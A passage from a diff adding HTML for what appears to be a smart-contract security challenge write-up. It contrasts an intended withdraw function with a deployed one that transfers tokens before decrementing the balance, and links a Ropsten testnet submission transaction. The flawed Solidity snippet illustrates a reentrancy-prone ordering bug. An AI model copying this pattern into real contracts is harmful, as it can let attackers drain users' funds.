+    <span class="token function">require</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>However, the contract is coded as follows:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span>uint256 amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">require</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h4 id="submission-transaction-18">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xd172a0fe62e154b55ca71d98f8003835121977c5ff18a1c4d76c97b5c4e380fb">https://ropsten.etherscan.io/tx/0xd172a0fe62e154b55ca71d98f8003835121977c5ff18a1c4d76c97b5c4e380fb</a></p>
+
